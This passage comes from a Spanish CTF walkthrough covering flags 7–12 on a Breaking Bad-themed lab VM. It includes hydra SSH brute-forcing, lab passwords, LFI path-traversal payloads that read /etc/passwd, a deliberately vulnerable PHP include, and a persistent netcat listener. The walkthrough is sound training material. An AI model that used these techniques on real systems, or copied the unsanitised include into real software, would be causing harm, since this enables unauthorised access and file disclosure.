<p>echo "Bandera7:’Mejor_llama_a_Saul’" &gt; /home/saul/bandera7.txt</p>
<p>sudo chown saul:saul /home/saul/bandera7.txt</p>
</blockquote>
<ol start="5" type="1">
<li><p><strong>Servicio reiniciado:</strong></p></li>
</ol>
<blockquote>
<p>sudo service ssh restart</p>
</blockquote>
<p><strong>Pista preparada</strong></p>
<blockquote>
<p>Dentro del usuario chow hay un archivo de texto oculto:</p>
</blockquote>
<p><img src="cookbook/media/image136.png"
style="width:5.83333in;height:4.08333in" /></p>
<p><span id="_Toc207189912" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Encontrar la pista</strong></p>
<p>En alguna de las ocasione que hemos realizado una conexión SSH usando
la contraseña de chow:</p>
<p><em>Ejecuta el cliente SSH:</em></p>
<p><em>ssh chow@192.168.1.44</em></p>
<p><em>Cuando te pida la contraseña, introduce</em></p>
<p><em>Ch0w$up1</em></p>
<p>Deberíamos de haber listado el directorio para que muestre también
los archivos ocultos:</p>
<p>ls -la</p>
<p><img src="cookbook/media/image137.png"
style="width:5.90556in;height:2.37986in" /></p>
<p>Ahí habríamos visto un fichero que se llama:
<em>.fring_to_chow_request.</em>txt</p>
<p>y que contiene el siguiente texto:</p>
<p><em>From: fring@company.com</em></p>
<p><em>To: chow@company.com</em></p>
<p><em>Subject: Solicitud sobre contraseñas de Saul</em></p>
<p><em>Date: Fri, 22 Aug 2025 10:34:00 +0000</em></p>
<p><em>Hola Chow,</em></p>
<p><em>Por favor, dile a Saul que deje de usar contraseñas
débiles.</em></p>
<p><em>Esto se ha convertido en un riesgo de seguridad para
todos.</em></p>
<p><em>Gracias,</em></p>
<p><em>Fring</em></p>
<p><img src="cookbook/media/image138.png"
style="width:4.01792in;height:3.14762in" /></p>
<p>Esto nos debe hacer pensar que la contraseña de saul es lo
suficientemente débil como para probar a descifrarla por fuerza
bruta.</p>
<p><strong>2️⃣ Fuerza bruta o intento directo</strong></p>
<p>Como la contraseña parece ser extremadamente débil, probaremos un
ataque de fuerza bruta contra el usuario saul, usando hydra y el
diccionario rockyou.txt:</p>
<p>hydra -L /home/kali/usuario.txt -P /home/kali/rockyou.txt
ssh://192.168.1.44</p>
<p><img src="cookbook/media/image139.png"
style="width:5.90556in;height:2.71875in" /></p>
<p>Premio, hydra ha encontrado en rockyou la contraseña que realmente
era débil de saul: 123456</p>
<p>Intentamos conectarnos con ese usuario:</p>
<p>ssh saul@192.168.1.44</p>
<p>Contraseña:</p>
<p>123456</p>
<p><img src="cookbook/media/image140.png"
style="width:5.90556in;height:3.57847in" /></p>
<p>✅ Conexión exitosa.</p>
<p><strong>3️⃣ Buscar la bandera</strong></p>
<p>Una vez dentro:</p>
<p>ls -l</p>
<p><img src="cookbook/media/image141.png"
style="width:4.6875in;height:0.88542in" /></p>
<p>Tenemos un archivo bandera7.txt y un directorio llamado evidencias
que es parte de otro reto. Mostramos el contenido de la bandera:</p>
<p>cat bandera7.txt</p>
<p><img src="cookbook/media/image142.png"
style="width:3.3125in;height:0.65625in" /></p>
<p>Salida esperada:</p>
<p>Bandera7:’Mejor_llama_a_Saul’</p>
<p><span id="_Toc207189913" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>permitir accesos críticos.</p></li>
<li><p>Refuerza la importancia de deshabilitar autenticación por
contraseña o usar claves fuertes.</p></li>
<li><p>Simula un escenario realista para pruebas de pentesting y
auditado.</p></li>
<li><p>El reto muestra cómo una configuración insegura de SSH
puede</p></li>
</ul>
<p><span id="_Toc207189914" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 7 atrapada: 'Mejor_llama_a_Saul'</mark><strong><br />
</strong></p>
<h1
id="bandera-8-certificado-tls-con-bandera-oculta-en-commonname"><strong>🏁
Bandera 8 – Certificado TLS con Bandera Oculta en
CommonName</strong></h1>
<p><strong>Categoría:</strong> Red / Forense / Criptografía<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Flag:</strong> El_miedo_es_el_verdadero_enemigo<br />
<strong>Usuario involucrado:</strong> victor<br />
<strong>Contraseña:</strong> <strong>XXXXXXXX</strong><br />
<strong>Archivo clave:</strong> TodoLoSabe.pcap<br />
📁 Ruta esperada: /home/victor/TodoLoSabe.pcap</p>
<p><span id="_Toc207189916" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe analizar tráfico TLS simulado en un archivo .pcap.
Entre sesiones con certificados falsos y ruido digital, hay uno que
contiene la bandera como parte de su <strong>CommonName</strong> (CN) y
<strong>SubjectAltName</strong> en un certificado TLS embebido.</p>
<p><span id="_Toc207189917" class="anchor"></span><strong>⚙️ Entorno
técnico preparado</strong></p>
<p>Se ha generado este .pcap con un script en Python que:</p>
<ul>
<li><p>Simula múltiples sesiones TCP hacia el puerto 443</p></li>
<li><p>Inserta un certificado TLS falso en formato DER</p></li>
<li><p>En uno de esos certificados, el CommonName contiene:</p></li>
<li><p>Bandera8:{El_miedo_es_el_verdadero_enemigo}</p></li>
</ul>
<p><span id="_Toc207189918" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Conexión SSH usando la cuenta de chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<blockquote>
<p>ssh <a href="mailto:chow@192.168.1.44">chow@192.168.1.44</a></p>
</blockquote>
<p>Cuando te pida la contraseña, introduce</p>
<blockquote>
<p>Ch0w$up1</p>
</blockquote>
<p><img src="cookbook/media/image143.png"
style="width:5.90556in;height:3.27361in" /></p>
<p>Nos desplazamos al directorio de victor y verificamos la presencia de
un archivo pcap.</p>
<p>ls -l</p>
<p><img src="cookbook/media/image144.png"
style="width:5.83333in;height:0.96875in" /></p>
<p>TodoLoSabe.pcap nos hace sospechar que lo que debemos buscar dentro
es TLS</p>
<p><strong>2️⃣ Abrir el archivo con Wireshark</strong></p>
<p>Lo que vamos a hacer es enviarnos ese archivo pcap a nuestra máquina
de Kali para analizarlo:</p>
<p>scp chow@192.168.1.44:/home/victor/TodoLoSabe.pcap .</p>
<p><img src="cookbook/media/image145.png"
style="width:5.90556in;height:1.00972in" /></p>
<p>File → Open → TodoLoSabe.pcap</p>
<p>Filtra sesiones TLS simuladas:</p>
<p>tcp.port == 443</p>
<p><strong>3️⃣ Buscar la bandera en los certificados</strong></p>
<p>Método rápido:</p>
<p>tcp contains "Bandera8"</p>
<p>Luego haz clic derecho sobre el paquete → Follow TCP Stream</p>
<p>Dentro del payload raw se verá:</p>
<p>Bandera8:{El_miedo_es_el_verdadero_enemigo}</p>
<p><img src="cookbook/media/image146.png"
style="width:5.90556in;height:3.14167in" /></p>
<p>✅ El jugador debe extraer solo lo que está entre las llaves como la
bandera final.</p>
<p><strong>4️⃣ Alternativa desde terminal</strong></p>
<p>Buscar directamente el CN en el contenido binario.</p>
<p>Ya que el certificado está en formato DER, puedes buscar directamente
la cadena "Bandera" en el archivo:</p>
<p>strings TodoLoSabe.pcap | grep Bandera</p>
<p><img src="cookbook/media/image147.png"
style="width:4.40625in;height:0.88542in" /></p>
<p>Esto ignora el protocolo y busca cualquier texto legible en el
archivo.</p>
<p><span id="_Toc207189919" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Se analiza tráfico cifrado donde el certificado incluye datos
falsos pero interpretables.</p></li>
<li><p>Introduce al jugador en técnicas de esteganografía en campos de
autenticación TLS.</p></li>
<li><p>Requiere conocimiento de estructuras DER, PKI y uso avanzado de
Wireshark o tshark.</p></li>
</ul>
<p><span id="_Toc207189920" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 8 atrapada:
'El_miedo_es_el_verdadero_enemigo'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-9-servicio-netcat-escuchando-en-puerto-oculto"><strong>🏁
Bandera 9 – Servicio Netcat Escuchando en Puerto Oculto</strong></h1>
<p><strong>Categoría:</strong> Red / Reconocimiento / Explotación
básica<br />
<strong>Nivel:</strong> Medio<br />
<strong>Flag:</strong> Estoy_en_el_negocio_del_imperio<br />
<strong>Servicio escondido:</strong> Netcat en puerto 31337<br />
<strong>Archivo clave:</strong> /opt/bandera9.txt<br />
📃 Contenido del archivo:</p>
<p>Bandera9: ’Estoy_en_el_negocio_del_imperio’</p>
<p><span id="_Toc207189922" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe realizar una <strong>enumeración de puertos
completa</strong> para descubrir que un servicio está escuchando en el
puerto 31337. Al conectarse, el servicio transmitirá el contenido del
archivo de la bandera a través de Netcat.</p>
<p><span id="_Toc207189923" class="anchor"></span><strong>⚙️ Entorno
técnico configurado</strong></p>
<p>Un <em><strong>"puerto oculto"</strong></em> es una técnica común en
los retos CTF para esconder un servicio vulnerable en un puerto poco
convencional, lo que obliga al atacante a realizar una enumeración
exhaustiva. En lugar de usar servicios estándar como HTTP en el puerto
80 o SSH en el 22, se configura el servicio en un puerto alto y
aleatorio (por ejemplo, 1337, 4444, 8888, 31337, etc.).</p>
<p><strong>¿Cómo funciona la técnica del puerto oculto?</strong></p>
<p>La idea principal es que las herramientas de escaneo de puertos por
defecto, como Nmap, suelen escanear un subconjunto de los puertos más
comunes (los 1000 puertos más conocidos). Si un servicio vulnerable no
está en uno de esos puertos, un escaneo superficial lo pasará por
alto.</p>
<p>El jugador debe realizar un escaneo completo de todos los puertos (-p
1-65535) para encontrar el servicio oculto. Una vez que lo encuentra, el
reto se vuelve similar a cualquier otro, pero el paso de enumeración
inicial es crucial y deliberadamente más difícil.</p>
<p>Para crear este tipo de reto, puedes usar herramientas ligeras como
Netcat</p>
<ol type="1">
<li><p><strong>Se ha creado el archivo de bandera:</strong></p></li>
</ol>
<blockquote>
<p>echo "Bandera9: ’Estoy_en_el_negocio_del_imperio’" &gt;
/opt/bandera9.txt</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Se ha iniciado Netcat en modo escucha:</strong></p></li>
</ol>
<blockquote>
<p>nc -lvp 31337 &lt; /opt/bandera9.txt</p>
</blockquote>
<ul>
<li><p>nc: El comando Netcat.</p></li>
<li><p>-l: Pone a Netcat en modo "oyente" (listener).</p></li>
<li><p>-v: Modo verboso (opcional, muestra información de la
conexión).</p></li>
<li><p>-p 31337: Especifica el puerto para escuchar.</p></li>
<li><p>&lt; /opt/bandera9.txt: Redirige el contenido del archivo de la
bandera a Netcat. Cuando un cliente se conecte, Netcat le enviará el
contenido del archivo y luego se cerrará.</p></li>
</ul>
<ol start="3" type="1">
<li><p><strong>El comando fue integrado en /etc/rc.local para
persistencia tras reinicio:</strong></p></li>
</ol>
<p>El comando nc -lvp 31337 &lt; /opt/bandera9.txt se ejecuta en primer
plano, lo que significa que:</p>
<p>🧍 Estará escuchando mientras la terminal esté abierta y el proceso
siga vivo.</p>
<p>🔄 Si reinicias la máquina, el proceso desaparecerá (no persistirá
tras el reinicio).</p>
<p>📡 Netcat no tiene comportamiento tipo “servicio” por sí mismo.</p>
<p><strong>¿Cómo hacer que siga activo tras el reinicio?</strong></p>
<p>Usar un script de inicio en /etc/rc.local (si está disponible)</p>
<blockquote>
<p>nc -lvp 31337 &lt; /opt/bandera9.txt &amp;</p>
<p>exit 0</p>
</blockquote>
<p><img src="cookbook/media/image148.png"
style="width:5.90694in;height:2.93333in" /></p>
<ol start="4" type="1">
<li><p><strong>Verificado que no hay reglas de iptables bloqueando el
tráfico entrante:</strong></p></li>
</ol>
<p>Este comando te mostrará todas las reglas actuales, incluyendo:</p>
<p>sudo iptables -L -n -v</p>
<ul>
<li><p>Las políticas por defecto de las cadenas (INPUT, OUTPUT,
FORWARD)</p></li>
<li><p>Los puertos bloqueados o permitidos</p></li>
</ul>
<p>💡Busca si hay alguna regla que afecte el puerto 31337 en la cadena
INPUT.</p>
<ul>
<li><p>Políticas de INPUT, FORWARD, OUTPUT: todas en ACCEPT</p></li>
</ul>
<p><img src="cookbook/media/image149.png"
style="width:5.90694in;height:1.53333in" /></p>
<p>Lo que muestra la imagen es muy claro: todas las cadenas (INPUT,
FORWARD, OUTPUT) tienen la política ACCEPT y no hay reglas configuradas
que interfieran. Eso significa:</p>
<p>🔓 No hay cortafuegos activo bloqueando el puerto 31337</p>
<p>✅ Todo el tráfico entrante, saliente y reenviado está siendo
aceptado por defecto</p>
<p><span id="_Toc207189924" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Escaneo completo de puertos</strong></p>
<p>El jugador debe usar nmap sin limitación de puertos:</p>
<p>nmap -p 1-65535 192.168.1.44</p>
<p><img src="cookbook/media/image150.png"
style="width:5.90556in;height:2.69792in" /></p>
<p>✅ Esto revelará el puerto 31337 como <strong>abierto</strong>.</p>
<p><strong>2️⃣ Conexión al puerto oculto</strong></p>
<p>Usando Netcat:</p>
<p>nc 192.168.1.44 31337</p>
<p>Al conectarse, Netcat enviará el contenido de la bandera
automáticamente.</p>
<p><img src="cookbook/media/image151.png"
style="width:5.90556in;height:0.85972in" /></p>
<p><strong>3️⃣ Resultado esperado en la terminal</strong></p>
<p>Bandera9: ’Estoy_en_el_negocio_del_imperio’</p>
<p>✅ ¡Flag obtenida directamente desde el servicio clandestino!</p>
<p><span id="_Toc207189925" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Refuerza la importancia del reconocimiento en profundidad (no
limitar escaneos a puertos conocidos).</p></li>
<li><p>Expone cómo Netcat puede utilizarse para transferir información
de manera discreta.</p></li>
<li><p>Introduce el concepto de persistencia de servicios mediante
scripts de arranque como rc.local.</p></li>
</ul>
<p><span id="_Toc207189926" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 9 atrapada:
'Estoy_en_el_negocio_del_imperio'</mark><strong><br />
</strong></p>
<h1 id="bandera-10-vulnerabilidad-lfi-en-aplicación-php"><strong>🏁
Bandera 10 – Vulnerabilidad LFI en Aplicación PHP</strong></h1>
<p><strong>Categoría:</strong> Web Exploitation / Local File
Inclusion<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Usted_no_es_una_persona_discreta<br />
<strong>Archivo vulnerable:</strong> ver.php<br />
📁 Ruta esperada: http://&lt;IP_CTF&gt;/ver.php<br />
📄 Bandera alojada en: /var/www/bandera10.txt</p>
<p><span id="_Toc207189928" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe descubrir que el script PHP ver.php permite incluir
archivos arbitrarios en el servidor sin validación, lo que le permitirá
leer archivos sensibles como /etc/passwd o incluso acceder directamente
al archivo que contiene la bandera.</p>
<p><span id="_Toc207189929" class="anchor"></span><strong>⚙️ Entorno
técnico configurado</strong></p>
<p>La vulnerabilidad LFI (Local File Inclusion) ocurre cuando una
aplicación web permite que un usuario incluya un archivo en el servidor,
generalmente a través de un parámetro en la URL, sin validar o sanear
adecuadamente la entrada. Un atacante puede manipular este parámetro
para cargar archivos fuera del directorio esperado de la aplicación,
como /etc/passwd o un archivo de logs que contenga su propio código
malicioso.</p>
<p><strong>¿Cómo funciona la vulnerabilidad LFI?</strong></p>
<p>Imagina que una página web utiliza una URL como
http://ejemplo.com/pagina.php?file=contacto.html para cargar diferentes
páginas. El script pagina.php toma el valor del parámetro file y lo
incluye directamente en el código de la página, por ejemplo, usando la
función include() de PHP.</p>
<p>Si un atacante cambia la URL a:</p>
<p><a
href="http://ejemplo.com/pagina.php?file=../../../../etc/passwd">http://ejemplo.com/pagina.php?file=../../../../etc/passwd</a></p>
<p>el servidor intentará cargar el archivo /etc/passwd. Los ../ (puntos
y barra) le permiten "subir" en la estructura de directorios, escapando
de la carpeta web. Si no hay una validación adecuada, el contenido del
archivo de contraseñas se mostrará en la página.</p>
<p>La explotación de LFI se puede usar para:</p>
<ol type="1">
<li><p>Leer archivos sensibles: Acceder a archivos como /etc/passwd para
obtener nombres de usuario o /etc/apache2/apache2.conf para ver la
configuración del servidor web.</p></li>
<li><p>Ejecución remota de código (RCE): La técnica más avanzada para un
CTF. El atacante puede inyectar código PHP malicioso en un archivo del
sistema al que tiene acceso (por ejemplo, un archivo de log de Apache),
y luego usar LFI para "incluir" ese archivo, lo que ejecuta el código
PHP.</p></li>
</ol>
<p><strong>Configuración implementada en la máquina</strong></p>
<ol type="1">
<li><p><strong>Servidor web Apache con PHP activo:</strong></p></li>
</ol>
<blockquote>
<p>sudo apt-get install apache2 php5 libapache2-mod-php5</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Archivo vulnerable creado</strong> en
/var/www/html/ver.php:</p></li>
</ol>
<blockquote>
<p>&lt;?php</p>
<p>$file = $_GET['file'];</p>
<p>include($file);</p>
<p>?&gt;</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>Bandera colocada fuera del directorio
web</strong>:</p></li>
</ol>
<blockquote>
<p>echo "Bandera10:’Usted_no_es_una_persona_discreta’" &gt;
/var/www/bandera10.txt</p>
<p>sudo chown root:root /var/www/bandera10.txt</p>
<p>sudo chmod 400 /var/www/bandera10.txt</p>
</blockquote>
<p><span id="_Toc207189930" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Localizar la pista</strong></p>
<p>En el código fuente de la página nosotros.html encontramos una pista
que nos dice:</p>
<p><img src="cookbook/media/image152.png"
style="width:5.54167in;height:0.61458in" /></p>
<p>Esto nos hace pensar que se trata de una vulnerabilidad de LFI:</p>
<p>http://192.168.1.44/ver.php?file=nosotros.html</p>
<p>Aquí es donde el jugador puede deducir que puede manipular el
parámetro file.</p>
<p>ver.php?file=</p>
<p><img src="cookbook/media/image153.png"
style="width:5.90556in;height:2.20417in" /></p>
<p><strong>2️⃣ Probar con archivo sensible del sistema</strong></p>
<p>Usar:</p>
<p><a
href="http://192.168.1.44/ver.php?file=../../../../etc/passwd">http://192.168.1.44/ver.php?file=../../../../etc/passwd</a></p>
<p><img src="cookbook/media/image154.png"
style="width:5.90556in;height:1.08472in" /></p>
<p>✅ Si aparece contenido, se confirma la vulnerabilidad LFI.</p>
<p><strong>3️⃣ Apuntar al archivo de la bandera</strong></p>
<p>Ya que la bandera está en /var/www/, y ver.php está en
/var/www/html/, se puede acceder con:</p>
<p>http://192.168.1.44/ver.php?file=../bandera10.txt</p>
<p>Esto sube un nivel y accede al archivo directamente.</p>
<p>http://192.168.1.44/ver.php?file=/var/www/bandera10.txt</p>
<p><img src="cookbook/media/image155.png"
style="width:5.90556in;height:1.17153in" /></p>
<p><img src="cookbook/media/image156.png"
style="width:5.90556in;height:0.975in" /></p>
<p><strong>4️⃣ Resultado esperado en navegador</strong></p>
<p>Bandera10:’Usted_no_es_una_persona_discreta’</p>
<p><span id="_Toc207189931" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El reto muestra los peligros de usar include() sin sanitizar
entradas.</p></li>
<li><p>Introduce técnicas de path traversal (../) para escapar de la
carpeta web.</p></li>
<li><p>Simula un entorno real de pentesting con PHP vulnerable.</p></li>
</ul>
<p><strong>🔧 Validación</strong></p>
<p>El jugador puede verificar vulnerabilidad desde terminal con
curl:</p>
<p>curl "http://192.168.1.44/ver.php?file=../bandera10.txt"</p>
<p><span id="_Toc207189932" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 10 atrapada:
'Usted_no_es_una_persona_discreta'</mark><strong><br />
</strong></p>
<h1 id="bandera-11-forense-de-pdf-con-códigos-de-ubicación"><strong>🏁
Bandera 11 – Forense de PDF con Códigos de Ubicación</strong></h1>
<p><strong>Categoría:</strong> Forense / Criptografía Posicional /
Document Analysis<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag reconstruida:</strong> blue_sky_save_family<br />
<strong>Código original:</strong> 8:15:3_5:5:11_48:13:3_68:7:6<br />
📄 Archivo clave: PDF del guion <em>Breaking Bad 312 – Half
Measures</em><br />
📁 Carpeta alojada en: /var/www/html/Privado</p>
<p><span id="_Toc207189934" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe analizar el contenido del PDF original del episodio
312 de Breaking Bad, localizar palabras específicas en distintas páginas
y líneas, y reconstruir una frase significativa que representa la
bandera.</p>
<p>Se ha creado una bandera CTF a partir de una frase oculta en el PDF
del guion de "Breaking Bad: Half Measures" (Episode 312). La bandera
debe ser una secuencia de códigos Página:Línea:Palabra para cada palabra
de la frase, y la frase debe estar compuesta por palabras de distintas
páginas del documento.</p>
<p><strong>Proceso de Ideación de la Frase:</strong></p>
<ul>
<li><p>Temática: Se buscó una frase que tuviera relevancia para la serie
"Breaking Bad" y que pudiera construirse con palabras clave dispersas en
el guion.</p></li>
<li><p>Elementos Clave Considerados:</p></li>
</ul>
<ul>
<li><p>"Blue Sky": El nombre del producto distintivo de Walter
White.</p></li>
<li><p>"Family": La motivación principal de Walter.</p></li>
<li><p>Verbos de acción/propósito: Como "saves", "protects", etc., para
conectar los elementos.</p></li>
</ul>
<ul>
<li><p>Frase Elegida: "Blue Sky saves family." Esta frase cumple con el
requisito de tener palabras en diferentes secciones y encapsula la
dualidad del negocio y la motivación de Walter.</p></li>
</ul>
<p><strong>Búsqueda y Localización de Palabras en el PDF:</strong></p>
<p>Se realizó un escaneo del contenido del PDF para encontrar las
ubicaciones exactas de cada palabra de la frase, siguiendo el formato
Página:Línea:Palabra.</p>
<p><strong>Palabra 1: "Blue"</strong></p>
<p>Código: 8:15:3 (Página 8, Línea 15 de esa página, Palabra 3)</p>
<p><img src="cookbook/media/image157.png"
style="width:4.56042in;height:2.66042in" /></p>
<p><strong>Palabra 2: "Sky"</strong></p>
<p>Código: 5:5:11 (Página 5, Línea 5 de esa página, Palabra 11)</p>
<p><img src="cookbook/media/image158.png"
style="width:5.90694in;height:2.18681in" /></p>
<p><strong>Palabra 3: "save"</strong></p>
<p>Código: 48:13:3 (Página 48, Línea 13 de esa página, Palabra 3)</p>
<p><img src="cookbook/media/image159.png"
style="width:5.32146in;height:2.97917in" /></p>
<p><strong>Palabra 4: "family."</strong></p>
<p>Código: 68:7:6 (Página 68, Línea 7 de esa página, Palabra 6)</p>
<p><img src="cookbook/media/image160.png"
style="width:5.90694in;height:2.52014in" /></p>
<p><strong>Construcción de la Bandera 11:</strong></p>
<p>Combinando los códigos de las palabras en el orden de la frase "blue
sky save family", la bandera resultante es:</p>
<p>8:15:3 5:5:11 48:13:3 68:7:6</p>
<p>8:15:3_5:5:11_48:13:3_68:7:6</p>
<p>Bandera 11: ‘8:15:3_5:5:11_48:13:3_68:7:6’</p>
<p>Creamos un archivo llamado bandera11.txt en el que colocamos el
código a modo de pista:</p>
<p><img src="cookbook/media/image161.png"
style="width:3.78056in;height:1.94653in" /></p>
<p>Y este archivo bandera11.txt junto con el PDF del Episodio 312 y
otros archivos para “despistar” los subimos al directorio /var/www/html
en una carpeta llamada Privado</p>
<p><img src="cookbook/media/image162.png"
style="width:5.90694in;height:1.24653in" /></p>
<p><img src="cookbook/media/image163.png"
style="width:5.90694in;height:1.8in" /></p>
<p><span id="_Toc207189935" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Localizar el archivo PDF</strong></p>
<p>Accede al servidor web:</p>
<p>http://192.168.1.44/Privado/</p>
<p>Allí estará el PDF junto a otros archivos señuelo, como:</p>
<ul>
<li><p>Los Pollos Hermanos Menú</p></li>
<li><p>certificado de higiene</p></li>
<li><p>manual del empleado</p></li>
</ul>
<p><img src="cookbook/media/image164.png"
style="width:5.90556in;height:3.80694in" /></p>
<p><strong>2️⃣ Obtener el código de ubicación</strong></p>
<p>Usar el archivo bandera11.txt que incluye la secuencia:</p>
<p>8:15:3_5:5:11_48:13:3_68:7:6</p>
<p><img src="cookbook/media/image165.png"
style="width:5.90556in;height:1.45833in" /></p>
<p>Esto representa:</p>
<ul>
<li><p>Página 8, Línea 15, Palabra 3 → "Blue"</p></li>
<li><p>Página 5, Línea 5, Palabra 11 → "Sky"</p></li>
<li><p>Página 48, Línea 13, Palabra 3 → "save"</p></li>
<li><p>Página 68, Línea 7, Palabra 6 → "family."</p></li>
</ul>
<p><strong>3️⃣ Abrir el PDF y navegar por ubicaciones</strong></p>
<p>Usa un visor con capacidad de copiar texto por línea, como
<strong>PDFStudio</strong>, <strong>Evince</strong>, o
<strong>Okular</strong>.</p>
<p>Alternativamente, desde terminal puedes extraer texto:</p>
<p>pdftotext half_measures_312.pdf - | les</p>
<p><img src="cookbook/media/image166.png"
style="width:5.90556in;height:3.21806in" /></p>
<p>Luego contar páginas manualmente, líneas y palabras.</p>
<p><strong>4️⃣ Reconstruir la bandera</strong></p>
<p>Unir las palabras en orden:</p>
<p>Blue Sky save family</p>
<p>Y transformarla en formato CTF:</p>
<p>blue_sky_save_family</p>
<p><span id="_Toc207189936" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Introduce al jugador en análisis posicional de texto plano en
PDFs.</p></li>
<li><p>Simula extracción forense real a partir de documentos
públicos.</p></li>
<li><p>Refuerza habilidades de scripting, OCR, y decodificación
contextual.</p></li>
</ul>
<p><span id="_Toc207189937" class="anchor"></span><strong>🔧 Tip
adicional</strong></p>
<p>El jugador puede automatizar la extracción con Python y bibliotecas
como PyPDF2, pdfminer, o pdfplumber.</p>
<p><span id="_Toc207189938" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 11 atrapada: 'blue_sky_save_family'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-12-linux-fundamentals-warm-up-breaking-the-txt"><strong>🏁
Bandera 12 – Linux Fundamentals / Warm-up: Breaking the
TXT</strong></h1>
<p><strong>Categoría:</strong> Linux Fundamentals / Warm-up<br />
<strong>Nivel:</strong> Básico<br />
<strong>Flag:</strong> Soy_el_hombre_que_mató_a_Gus_Fring<br />
<strong>Usuario involucrado:</strong> lydia<br />
📁 Carpeta clave: /home/lydia/<br />
📄 Archivos clave:</p>
<ul>
<li><p>bndr12.txt – archivo visible al jugador</p></li>
</ul>
<p><span id="_Toc207189940" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe descubrir que un archivo con extensión .txt puede ser
ejecutable en Linux si contiene un shebang y recibe permisos de
ejecución.</p>
<p>Al ejecutar el fichero, este desencadena un script oculto que genera
la bandera final en el mismo directorio.</p>
<p><strong>Entorno preparado</strong></p>
<p>Utilizamos un script para desplegar el reto.</p>
<p><strong>🔧 Script de instalación</strong></p>
<p>#!/bin/bash</p>
<p># Instalador reto CTF "Bandera12"</p>
<p>USER_HOME="/home/lydia"</p>
<p>CTF_FILE="bndr12.txt"</p>
<p>FLAG_FILE="bander12.txt"</p>
<p>SECRET_SCRIPT=".generar_bandera.sh"</p>
<p># 1. Crear archivo de pista estilo mexicano / Breaking Bad</p>
<p>sudo mkdir -p "$USER_HOME"</p>
<p>sudo bash -c "cat &gt; '$USER_HOME/$CTF_FILE' &lt;&lt;'EOF'</p>
<p>#!/bin/bash</p>
<p>bash \"\$(dirname \"\$0\")/$SECRET_SCRIPT\"</p>
<p>EOF"</p>
<p># 2. Crear script oculto que genera la bandera</p>
<p>sudo bash -c "cat &gt; '$USER_HOME/$SECRET_SCRIPT' &lt;&lt;'EOF'</p>
<p>#!/bin/bash</p>
<p>echo \"Bandera12: 'Soy_el_hombre_que_mató_a_Gus_Fring'\" &gt;
\"\$(dirname \"\$0\")/$FLAG_FILE\"</p>
<p>chmod 644 \"\$(dirname \"\$0\")/$FLAG_FILE\"</p>
<p>echo '¡Orale, compa! Aquí está la bandera... pero recuerda, en
Albuquerque nada es gratis. Bandera12:
‘Soy_el_hombre_que_mató_a_Gus_Fring’'</p>
<p>EOF"</p>
<p># 3. Permisos</p>
<p>sudo chmod 755 "$USER_HOME/$SECRET_SCRIPT"</p>
<p>sudo chmod +x "$USER_HOME/$CTF_FILE"</p>
<p>sudo chown lydia:lydia "$USER_HOME/$CTF_FILE"
"$USER_HOME/$SECRET_SCRIPT"</p>
<p># 4. Añadir pista al principio de bndr12.txt</p>
<p>sudo bash -c "echo \"// Eh, socio... dicen que si a este papelito le
das poder de ejecución, va a cantar la verdad más rápido que Heisenberg
cocinando azul.\" | cat - '$USER_HOME/$CTF_FILE' &gt;
'$USER_HOME/${CTF_FILE}.tmp' &amp;&amp; mv '$USER_HOME/${CTF_FILE}.tmp'
'$USER_HOME/$CTF_FILE'"</p>
<p>echo "Reto instalado correctamente en $USER_HOME"</p>
<p><span id="_Toc207189941" class="anchor"></span><strong>📜 Dinámica
breve</strong></p>
<ul>
<li><p>En /home/lydia habrá un archivo
<strong>bndr12.txt</strong>.</p></li>
<li><p>Si el jugador lo <strong>hace ejecutable y lo lanza</strong>
(chmod +x bndr12.txt &amp;&amp; ./bndr12.txt), internamente llamará a un
script oculto que generará <strong>bander12.txt</strong> con la bandera
final.</p></li>
<li><p>Aunque el archivo tenga extensión .txt, en Linux lo que importa
es que tenga el <em>shebang</em> (#!/bin/bash, por ejemplo) y permisos
de ejecución (chmod +x). El sistema lo ejecutará si lo invocas con
./nombre.</p></li>
</ul>
<p><span id="_Toc207189942" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>Conexión SSH usando la cuenta de chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseña, introduce</p>
<p>Ch0w$up1</p>
<p>Nos dirigimos al directorio de lydia:</p>
<p>/home/lydia</p>
<p><img src="cookbook/media/image122.png"
style="width:3.625in;height:0.76042in" /></p>
<p>y vemos bndr12.txt y el archivo pcap de la bandera 5.</p>
<p>Lo leemos:</p>
<p>cat bndr12.txt</p>
<blockquote>
